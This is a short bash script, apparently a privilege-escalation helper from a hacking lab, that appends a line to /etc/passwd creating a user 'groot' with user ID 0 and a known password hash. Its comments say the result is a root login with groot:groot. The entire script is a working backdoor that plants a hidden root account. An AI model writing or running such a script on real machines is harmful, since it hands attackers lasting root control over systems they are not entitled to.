#!/bin/env bash

# Script to get to root using the /dev/shm/rk.sh script.

# generate password with: openssl passwd -1 -salt groot groot
password="$1$groot$lM0MiPVydk.DfCCIAwtck1"
echo "groot:$password:0:0:groot:/root:/bin/bash" >> /etc/passwd

# Now you can login as root with groot:groot
